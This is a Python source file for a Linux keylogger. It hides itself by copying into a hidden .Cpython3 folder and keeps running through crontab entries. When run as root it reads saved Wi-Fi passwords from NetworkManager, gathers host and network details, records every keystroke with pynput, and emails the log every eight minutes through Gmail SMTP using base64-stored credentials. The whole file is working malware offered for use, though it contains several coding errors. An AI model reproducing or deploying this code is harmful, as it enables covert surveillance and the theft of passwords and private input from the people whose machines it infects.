#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import os
import urllib.request
from json import load
import datetime 
import platform
import subprocess
import sys
import time
import getpass
import shutil
import base64
import signal
import re

if 'root' in getpass.getuser() :
        try :
            if os.path.exists('/etc'+'/.Cpython3/'+'.'+os.path.basename(__file__).strip()):
                pass
            else:
                 New_path = os.mkdir('/etc'+'/.Cpython3/')
                 copy_scrpit = shutil.copy(os.path.abspath(__file__),'/etc/.Cpython3' ) 
                 os.chdir('/etc'+'/.Cpython3/')
                 rename = os.rename(os.path.basename(__file__),str('.'+os.path.basename(__file__)+'w'))
                 sub_chmod = 'chmod +x /etc/.Cpython3'+'/.'+os.path.basename(__file__)+'w'
                 subprocess.call(sub_chmod,shell=True) 
                 with open('.shellcron','w') as cron :
                      cron.write("#!/bin/sh"+"\n"+"{crontab-l -u root ; echo  '29 * * * * killall -9 "+\
                      str('.'+os.path.basename(__file__))+"w"+" 2>&1 &"+"';"+"\n"+" echo  '30 * * * * cd /etc/.Cpython3 && nohup ./"+\
                      str('.'+os.path.basename(__file__))+"w"+" > ./"+str('.'+os.path.basename(__file__))+"w"+".out  2>&1 &';}| crontab -u root - "+\
                      "\n"+"exit 0"+"\n")
                      cron_chmod = 'chmod +x .shellcron.sh'
                      subprocess.call(cron_chmod,shell=True) 
                      croncall = './.shellcron.sh > /dev/null 2>&1 &' 
                      subprocess.Popen(croncall,shell=True) 
                 if os.exists('.shellcron.sh') :
                    os.remove('.shellcron.sh')       
                         
                                 
        except FileExistsError: 
               pass  


if os.path.exists('/home/'+getpass.getuser()+'/.Cpython3/'+'.'+os.path.basename(__file__).strip()):
   pass
else:
    try:  
        New_path = str(os.mkdir('/home/'+getpass.getuser()+'/.Cpython3'.strip())) 
        copy_scrpit = shutil.copy(os.path.abspath(__file__),str('/home/'+getpass.getuser()+'/.Cpython3')) 
        os.chdir(str('/home/'+getpass.getuser()+'/.Cpython3/').strip())  
        sub_chmod = 'chmod +x '+os.path.basename(__file__)
        subprocess.call(sub_chmod,shell=True)         
        rename = os.rename(os.path.basename(__file__),str('.'+os.path.basename(__file__)+'w'))
        with open('.shellcron.sh','w')as cron :
                 cron.write("#!/bin/sh"+"\n"+"{ crontab -l -u "+getpass.getuser()+" ;"+"\n"+"echo '29 * * * * killall -9 "+\
                 str('.'+os.path.basename(__file__))+"w"+" 2>&1 &"+"';"+"\n"+"echo '30 * * * * cd /home/"+getpass.getuser()+\
                 "/.Cpython3 &&  nohup ./"+str('.'+os.path.basename(__file__))+"w"+" > ./"+str('.'+os.path.basename(__file__))+"w"+\
                 ".out  2>&1 &';}| crontab -u "+getpass.getuser()+" -"+"\n"+"exit 0"+"\n")                          
                 cron_chmod = 'chmod +x .shellcron.sh'
                 subprocess.call(cron_chmod,shell=True) 
                 croncall = './.shellcron.sh > /dev/null 2>&1 &' 
                 subprocess.Popen(croncall,shell=True) 
        if os.path.exists('.shellcron.sh') :
           os.remove('.shellcron.sh')        
                        
    except FileExistsError: 
           pass
try:
    public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
except Exception:      
    public_ip = 'None'
host_name  = socket.gethostname()
host_ip    = socket.gethostbyname(host_name)
time_date  = now = datetime.datetime.now()
os_name    = platform.system()
os_release = platform.release()
try:
        username = getpass.getuser()   
        command = 'ls  /etc/NetworkManager/system-connections |grep .' 
        interface = subprocess.check_output(command,shell=True).decode('utf-8')
        with open ('.read','w')as file0:
               file_1 =file0.write(interface.strip('\n'))
        list= open('.read')             
        line_1= list.readlines()   
        for line in line_1: 
               name = '/etc/NetworkManager/system-connections/'+'{}'.format(line)
               name=str(name)
               name_1=name.replace('\n','')
               if 'root'in username:
                  rootuser= "grep -hr '^psk=' /etc/NetworkManager/system-connections/"+'{}'.format(line)
                  passwordwifi = subprocess.check_output(rootuser,shell=True)
                  passwordclear = passwordwifi.replace('psk=','') 
                  with open('.read3','a')as file00:
                    file01=file00.write(passwordclear) 
               else:      
                  pass    
               name_2 = name_1.replace('/etc/NetworkManager/system-connections/','')
               name_3 =name_2.replace('.nmconnection','')
               modefied=os.path.getatime(name_1)
               time_time = time.ctime(modefied) 
               if os.path.exists('.read'):
                  os.remove('.read')
               with open ('.read1','a')as file0:
                   file_1 =file0.write(name_3+'\n'+time_time+'\n')
                  
        with open ('.read1','r',)as file_1:
              file_2 =file_1.readlines()
        if 'root'  in username:
              with open('.read3','r')as file00:
                   file01=file00.readlines()        
              try:               
                 ssid1     = file_2[0]
                 TCssid1   = file_2[1]
                 password1 = file01[0]
                 ssid2     = file_2[2]
                 TCssid2   = file_2[3] 
                 password2 = file01[1]
                 ssid3     = file_2[4]
                 TCssid3   = file_2[5] 
                 password3 = file01[2]                                
              except IndexError:
                     try: 
                        sssid1    = file_2[0]
                        TCssid1   = file_2[1]
                        password1 = file01[0]
                        ssid2     = file_2[2]
                        TCssid2   = file_2[3] 
                        password2 = file01[1]    
                        ssid3     = 'None'+'\n'
                        TCssid3   = 'None'+'\n'
                        password3 = 'None'+'\n'     
                     except IndexError: 
                            try:
                               ssid1     = file_2[0]
                               TCssid1   = file_2[1]
                               password1 = file01[0]
                               ssid2     = 'None'+'\n'
                               TCssid2   = 'None'+'\n'
                               password2 = 'None'+'\n'   
                               ssid3     = 'None'+'\n'
                               TCssid3   = 'None'+'\n' 
                               password3 = 'None'+'\n' 
                            except IndexError:
                                   pass  
        else:      
            try:               
                 ssid1     = file_2[0]
                 TCssid1   = file_2[1]
                 password1 = 'Need root privilege'+'\n'
                 ssid2     = file_2[2]
                 TCssid2   = file_2[3] 
                 password2 = 'Need root privilege'+'\n'
                 ssid3     = file_2[4]
                 TCssid3   = file_2[5] 
                 password3 = 'Need root privilege'+'\n'                                
            except IndexError:
                     try: 
                        sssid1    = file_2[0]
                        TCssid1   = file_2[1]
                        password1 = 'Need root privilege'+'\n'
                        ssid2     = file_2[2]
                        TCssid2   = file_2[3] 
                        password2 = 'Need root privilege'+'\n'   
                        ssid3     = 'None'+'\n'
                        TCssid3   = 'None'+'\n'
                        password3 = 'None'+'\n'     
                     except IndexError: 
                            try:
                               ssid1     = file_2[0]
                               TCssid1   = file_2[1]
                               password1 = 'Need root privilege'+'\n'
                               ssid2     = 'None'+'\n'
                               TCssid2   = 'None'+'\n'
                               password2 = 'None'+'\n'   
                               ssid3     = 'None'+'\n'
                               TCssid3   = 'None'+'\n' 
                               password3 = 'None'+'\n' 
                            except IndexError:
                                   pass  
                                     
except subprocess.CalledProcessError: 
            ssid1     = 'None'+'\n'
            TCssid1   = 'None'+'\n'
            password1 = 'None'+'\n'
            ssid2     = 'None'+'\n'
            TCssid2   = 'None'+'\n' 
            password2 = 'None'+'\n'
            ssid3     = 'None'+'\n'
            TCssid3   = 'None'+'\n'
            password3 = 'None'+'\n'

print_pub       = 'Public Ip         ..........| '+str(public_ip)
print_local_ip  = 'Local Ip          ..........| '+str(host_ip)
print_hostname  = 'Host Name         ..........| '+str(host_name)
print_os_name   = 'OS Name           ..........| '+str(os_name)
print_os_re     = 'OS Release        ..........| '+str(os_release)
print_username  = 'User Name         ..........| '+str(username)
print_WIFI      = '='*20+'\n'+'Wifi Information:-'+'\n'+'='*20+'\n'            
Linux_wifi1     = 'Interface Wi-Fi   ..........| '+str(ssid1)
Create_Time1    = 'Modefied Time     ..........| '+str(TCssid1)
print1password  = 'Security key      ..........| '+str(password1)
Linux_wifi1     = 'Interface Wi-Fi   ..........| '+str(ssid1)
Create_Time1    = 'Modefied Time     ..........| '+str(TCssid1)
print1password  = 'Security key      ..........| '+str(password1)
Linux_wifi2     = 'Interface Wi-Fi   ..........| '+str(ssid2)
Create_Time2    = 'Modefied Time     ..........| '+str(TCssid2)
print2password  = 'Security key      ..........| '+str(password2)
Linux_wifi3     = 'Interface Wi-Fi   ..........| '+str(ssid3)
Create_Time3    = 'Modefied Time     ..........| '+str(TCssid3)
print3password  = 'Security key      ..........| '+str(password3)      
print_time      = 'Starting Time     ..........| '+str(time_date)
print_line      = '='*40+'\n'
print_info      = "Wifi Info         ..........| No WiFi InterFace Found"
if  os.path.exists('.log_Key'):        
        os.remove('.log_Key')

list_keys= str([
                'up','Key.esc','Key.caps_lock','Key.tab','Key.ctrl_r','Key.caps_lock','Key.num_lock',
                'Key.alt_r','Key.left','Key.up','Key.down','Key.backspace','Key.right','Key.shift_r',
                'Key.ctrl','Key.shift','Key.f1','Key.f2','Key.f3','Key.f4','Key.ctrl_l','Key.end'
                'Key.f5','Key.f6','Key.f7','Key.f8','Key.page_up','Key.home' ,'Key.page_down',
                'Key.f9','Key.f10','Key.f11','Key.f12','Key.delete','None','Key.insert',
                 ])                    
class Keylogger:

        def __init__(self,time_interval ):
                                            
                 global list_keys                                     
                 global print_pub
                 global print_local_ip
                 global print_os_name
                 global print_os_re
                 global print_time
                 global print_line
                 global host_name
                 global print_SSID
                 global print_password
                 global print_WIFI
                 global print2SSID
                 global print2password
                 global print3SSID
                 global print3password
                 global ptrint_info
                 global print_username
                 global Linux_wifi1 
                 global Create_Time1 
                 global Linux_wif2
                 global Create_Time2 
                 global Linux_wifi3
                 global Create_Time3 
                 
                 self.time_count = time_interval    
                 self.caps = False
                 
        def ADD_LOG_KEY(self,string):            
         
            self.log = self.log + string     
        
        def KEY_PRESS_KEYBOARD(self,Key):
            try:
                self.press_Key = str(Key.char)
                
            except AttributeError:
               
                if str(Key) in list_keys :
                       self.press_Key = ""
                if Key == Key.space:
                       self.press_Key = " "
                if Key == Key.enter:
                       self.press_Key = "\n"  
               
                if Key ==Key.backspace:
                    with open('.log_Key')as log:
                        log_file=log.read()
                        log_cut = log_file[0:-1]    
                    with open('.log_Key','w')as log:  
                         log_write = log.write(log_cut)    
                if Key ==Key.caps_lock:
                     if not self.caps:
                         self.caps = True
                     else:
                         self.caps = False  
                else:
                    
                    self.press_Key = " " + str(Key) +" "
                    if str(Key) in list_keys:
                       self.press_Key = ""
                    if Key == Key.space:
                       self.press_Key = " "
                    if Key == Key.enter:
                       self.press_Key = "\n" 
                    
                    if Key ==Key.backspace:  
                       with open('.log_Key')as log:
                            log_file=log.read()
                            log_cut = log_file[0:-1]  
                       with open('.log_Key','w')as log:  
                            log_write = log.write(log_cut)    
                    if Key ==Key.caps_lock:
                       if not self.caps:
                          self.caps = True
                       else:
                           self.caps = False   
                                            
            if self.caps :
               self.ADD_LOG_KEY(self.press_Key.upper())
               with open('.log_Key','a',encoding="utf-8")as file0:
                    file1 =file0.write(self.press_Key.upper()).decode('utf-8')
            else:
               self.ADD_LOG_KEY(self.press_Key)
               with open('.log_Key','a',encoding="utf-8")as file0:
                         file1 =file0.write(self.press_Key).decode('utf-8')  
                                  
        def START_SEND_ANDTIME(self):
            self.SEND_LOG_EMAILl()
            self.log = " "
            timer = threading.Timer(self.time_count , self.START_SEND_ANDTIME)
            timer.start()                
            if 'None'in Linux_wifi1 and 'None'in Create_Time1 and 'None'in print1password \
                       and 'None'in Linux_wifi2 and 'None'in Create_Time2 and 'None'in print2password \
                       and 'None'in Linux_wifi3 and 'None'in Create_Time3 and 'None'in print3password :                                 
                        with open ('.log_Key','w',encoding="utf-8")as file0:
                            file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                                  +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_info+'\n'+"="*30\
                                  +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'+print_time+'\n'\
                                  +print_line+'\n').decode('utf-8')
            else:
                with open ('.log_Key','w',encoding="utf-8")as file0:
                     file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                         +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+Linux_wifi1+Create_Time1\
                         +print1password+Linux_wifi2+Create_Time2+print2password+Linux_wifi3+Create_Time3+print3password+"="*30+'\n'\
                         +'Keylogger Start'+'\n'+"="*30+'\n'+print_time+'\n'\
                         +print_line+'\n').decode('utf-8')
        def SEND_LOG_EMAILl(self):
            try:
                msg = MIMEMultipart()
                msg['From'] ='jacstory'
                msg['To'] ='jacstory'
                msg['Subject'] = "jaclogger has started ".upper()
                socket_id= socket.gethostname()
                body =socket.gethostname()+'.txt'.strip()
                msg.attach(MIMEText(body,'plain'))    
                if  os.path.exists('.log_Key'):                   
                    attachment = open('.log_Key','rb')     
                    filename =body
                    part = MIMEBase('application','octect-stream')
                    part.set_payload((attachment).read())
                    encoders.encode_base64(part)
                    part.add_header('content-disposition','attachment;filename='+str(filename))
                    msg.attach(part)
                    text = msg.as_string()
                    SERVER = smtplib.SMTP('smtp.gmail.com',587)
                    SERVER.ehlo()
                    SERVER.starttls()
                    SERVER.ehlo()
                    SERVER.login(base64.b64decode(self.Ecode).decode("utf-8") ,base64.b64decode(self.Scode).decode("utf-8") )
                    SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8"),base64.b64decode(self.Ecode).decode("utf-8") , text)
                    attachment.close()
                    SERVER.close()
                if  os.path.exists('.log_Key') :        
                    os.remove('.log_Key')                               
                if  os.path.exists('.read1'):
                    os.remove('.read1') 
                if  os.path.exists('.read3'):
                    os.remove('.read3')   
            except smtplib.SMTPAuthenticationError:
                      pass             
        def GO_START(self):
            import os
            try:
              import pynput.keyboard
            except ImportError:       
                try:
                    command_in = 'pip3 install --upgrade pip 2>/dev/null'                     
                    subprocess.check_output (command_in,shell=True)
                    command2= 'pip install pynput==1.6.8  2>/dev/null'                     
                    subprocess.check_output (command2,shell=True)
                except Exception :   
                  pass                             
            try:
               if os.environ['DISPLAY']==':0': 
                  import pynput.keyboard  
               else:
                  if os.environ['DISPLAY']==':1':
                    import pynput.keyboard        
            except:
               try:
                 os.environ['DISPLAY']=':0' 
                 import pynput.keyboard  
               except:
                    os.environ['DISPLAY']=':1'
                    import pynput.keyboard                                                                                                                 
            #  import pynput.keyboard   #####    pip install pynput==1.6.8  For copmpel py2exe 
            self.Ecode  = 'chhkhbkhbWlsLmNvbQbkbvhgjcj=='             # add your email address encode base64
            self.Scode  = 'cmhhhghvhcgjcghvhNg=='             #add your password encode base64 
            Keyboard_listener = pynput.keyboard.Listener(on_press=self.KEY_PRESS_KEYBOARD)
            with Keyboard_listener:

                self.START_SEND_ANDTIME()
                Keyboard_listener.join()
                
if __name__=='__main__':     
  
   Keylogger = Keylogger(480)
   Keylogger.GO_START()            
                                
                              	 
